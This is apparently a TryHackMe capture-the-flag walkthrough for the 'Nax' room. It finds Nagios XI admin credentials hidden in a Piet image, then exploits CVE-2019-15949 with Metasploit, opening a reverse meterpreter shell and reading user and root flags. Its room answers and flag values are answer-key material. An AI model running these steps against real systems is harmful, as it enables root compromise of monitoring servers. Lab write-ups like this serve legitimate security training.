# Nax

Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.

# #1

**What hidden file did you find?**

Let's start by enumerating the services with nmap:

~~~
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-03-23T23:42:04
|_Not valid after:  2030-03-21T23:42:04
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Not valid before: 2020-03-24T00:14:58
|_Not valid after:  2030-03-22T00:14:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

Connecting to the main web page on port 80/tcp reveals the presence of a Nagios installation (`/nagiosxi/`) and a sequence of elements: `Ag, Hg, Ta, ...`.

~~~
unknown@kali:/data/tmp$ curl -s http://10.10.75.60
<html>
<head></head>
<body>
<! --/nagiosxi/ --> 
	<pre>
		     ,+++77777++=:,                    +=                      ,,++=7++=,,
		    7~?7   +7I77 :,I777  I          77 7+77 7:        ,?777777??~,=+=~I7?,=77 I
		=7I7I~7  ,77: ++:~+777777 7     +77=7 =7I7     ,I777= 77,:~7 +?7, ~7   ~ 777?
		77+7I 777~,,=7~  ,::7=7: 7 77   77: 7 7 +77,7 I777~+777I=   =:,77,77  77 7,777,
		  = 7  ?7 , 7~,~  + 77 ?: :?777 +~77 77? I7777I7I7 777+77   =:, ?7   +7 777?
		      77 ~I == ~77=77777~: I,+77?  7  7:?7? ?7 7 7 77 ~I   7I,,?7 I77~
		       I 7=77~+77+?=:I+~77?     , I 7? 77 7   777~ +7 I+?7  +7~?777,77I
		         =77 77= +7 7777         ,7 7?7:,??7     +7    7   77??+ 7777,
		             =I, I 7+:77?         +7I7?7777 :             :7 7
		                7I7I?77 ~         +7:77,     ~         +7,::7   7
		               ,7~77?7? ?:         7+:77           77 :7777=
		                ?77 +I7+,7         7~  7,+7  ,?       ?7?~?777:
		                   I777=7777 ~     77 :  77 =7+,    I77  777
		                     +      ~?     , + 7    ,, ~I,  = ? ,
		                                    77:I+
		                                    ,7
		                                     :777
		                                        :
						Welcome to elements.
					Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
	</pre>
</body>
<html>
~~~

Making some searches on the Internet shows that each element of the [periodic table](https://en.wikipedia.org/wiki/Periodic_table) has a number associated (Ag = 47, Hg = 80, Ta = 73, ...). Let's see if these numbers could be ASCII characters:

~~~
$ python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"
/PI3T.PNg
~~~

Answer: `PI3T.PNg`

# #2

**Who is the creator of the file?**

~~~
$ /data/src/exiftool-12.00/exiftool PI3T.PNg 
ExifTool Version Number         : 12.00
File Name                       : PI3T.PNg
Directory                       : .
File Size                       : 959 kB
File Modification Date/Time     : 2020:03:25 05:00:15+01:00
File Access Date/Time           : 2020:08:19 10:51:43+02:00
File Inode Change Date/Time     : 2020:08:19 10:51:43+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 990
Image Height                    : 990
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 768 bytes, use -b option to extract)
Transparency                    : (Binary data 256 bytes, use -b option to extract)
Artist                          : Piet Mondrian
Copyright                       : Piet Mondrian, tryhackme 2020
Image Size                      : 990x990
Megapixels                      : 0.980
~~~

Answer: `Piet Mondrian`

# #3

**If you get an error running the tool for on your downloaded image about an unknown ppm format -- just open it with gimp or another paint program and export to ppm format and try again!**

Searching for `piet` leads to [npiet](http://www.bertnase.de/npiet/npiet-1.3f.tar.gz), a PIET decoder.

~~~
unknown@kali:~/Downloads/npiet-1.3f$ ./npiet /data/tmp/files/PI3T.ppm 
nagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin%n3p3UQ&9BjLp4$7uhWdYnagiosadmin[REDACTED]
~~~

The program outputs a long sequence that seems to reveal a username (`nagiosadmin`) and a password (`n3p3UQ&9BjLp4$7uhWdY`)

We can now login against the Nagios website (http://10.10.75.60/nagiosxi/) using these credentials, which reveals an outdated "Nagios XI 5.5.6" version.

# #4

**What is the username you found?**

Answer: `nagiosadmin`

# #5

**What is the password you found?**

*Hint: `%` is a separator*

Answer: `n3p3UQ&9BjLp4$7uhWdY`

# #6

**What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000**

Searching for [exploits against Nagios XI](https://www.cvedetails.com/vulnerability-list/vendor_id-1424/Nagios.html) reveals a critical vulnerability identified as `CVE-2019-15949`:

~~~
Nagios XI before 5.6.6 allows remote command execution as root. The exploit requires access to the server as the nagios user, or access as the admin user via the web interface. The getprofile.sh script, invoked by downloading a system profile (profile.php?cmd=download), is executed as root via a passwordless sudo entry; the script executes check_plugin, which is owned by the nagios user. A user logged into Nagios XI with permissions to modify plugins, or the nagios user on the server, can modify the check_plugin executable and insert malicious commands to execute as root. 
~~~

Answer: `CVE-2019-15949`

# #7

**Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`.**

~~~
$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search CVE-2019-15949

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/linux/http/nagios_xi_authenticated_rce  2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution


msf5 > use 0
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > show options

Module options (exploit/linux/http/nagios_xi_authenticated_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to NagiosXI
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   nagiosadmin      yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux (x64)


msf5 exploit(linux/http/nagios_xi_authenticated_rce) > 
~~~

# #8

**After Metasploit has started, let's search for our target exploit using the command 'search applicationame'. What is the full path (starting with exploit) for the exploitation module?**

Answer: `exploit/linux/http/nagios_xi_authenticated_rce`

# #9

**Compromise the machine and locate user.txt**

~~~
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set rhost 10.10.221.0
rhost => 10.10.221.0
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set lhost 10.9.0.54
lhost => 10.9.0.54
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > set password n3p3UQ&9BjLp4$7uhWdY
password => n3p3UQ&9BjLp4$7uhWdY
msf5 exploit(linux/http/nagios_xi_authenticated_rce) > exploit 

[*] Started reverse TCP handler on 10.9.0.54:4444 
[*] Found Nagios XI application with version 5.5.6.
[*] Uploading malicious 'check_ping' plugin...
[*] Command Stager progress - 100.00% done (897/897 bytes)
[+] Successfully uploaded plugin.
[*] Executing plugin...
[*] Waiting for the plugin to request the final payload...
[*] Sending stage (3012516 bytes) to 10.10.221.0
[*] Meterpreter session 1 opened (10.9.0.54:4444 -> 10.10.221.0:46688) at 2020-08-19 12:38:23 +0200
[*] Deleting malicious 'check_ping' plugin...
[+] Plugin deleted.

meterpreter > 
meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2020-03-25 04:45:51 +0100  galand

meterpreter > cd galand
meterpreter > ls
Listing: /home/galand
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  481   fil   2020-03-25 05:07:21 +0100  .bash_history
100644/rw-r--r--  220   fil   2020-03-23 18:38:06 +0100  .bash_logout
100644/rw-r--r--  3771  fil   2020-03-23 18:38:06 +0100  .bashrc
40700/rwx------   4096  dir   2020-03-23 23:59:15 +0100  .cache
40755/rwxr-xr-x   4096  dir   2020-03-24 00:42:44 +0100  .cpan
40700/rwx------   4096  dir   2020-03-24 00:42:45 +0100  .gnupg
40775/rwxrwxr-x   4096  dir   2020-03-25 04:45:26 +0100  .nano
100644/rw-r--r--  655   fil   2020-03-23 18:38:06 +0100  .profile
100600/rw-------  1024  fil   2020-03-24 01:08:28 +0100  .rnd
40755/rwxr-xr-x   4096  dir   2020-03-24 01:04:03 +0100  .subversion
100644/rw-r--r--  0     fil   2020-03-23 23:59:40 +0100  .sudo_as_admin_successful
40755/rwxr-xr-x   4096  dir   2020-03-24 01:08:49 +0100  nagiosxi
100664/rw-rw-r--  38    fil   2020-03-25 04:45:51 +0100  user.txt

meterpreter > cat user.txt
THM{84b17add1d72a9f2e99c33bc568ae0f1}
~~~

Answer: `THM{84b17add1d72a9f2e99c33bc568ae0f1}`

# #10

**Locate root.txt**

~~~
meterpreter > cd /root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  3106  fil   2020-03-23 18:35:01 +0100  .bashrc
40755/rwxr-xr-x   4096  dir   2020-03-25 04:26:58 +0100  .nano
100644/rw-r--r--  148   fil   2020-03-23 18:35:01 +0100  .profile
100644/rw-r--r--  38    fil   2020-03-25 04:46:25 +0100  root.txt
40755/rwxr-xr-x   4096  dir   2020-03-24 00:48:36 +0100  scripts

meterpreter > cat root.txt
THM{c89b2e39c83067503a6508b21ed6e962}
~~~

Answer: `THM{c89b2e39c83067503a6508b21ed6e962}`
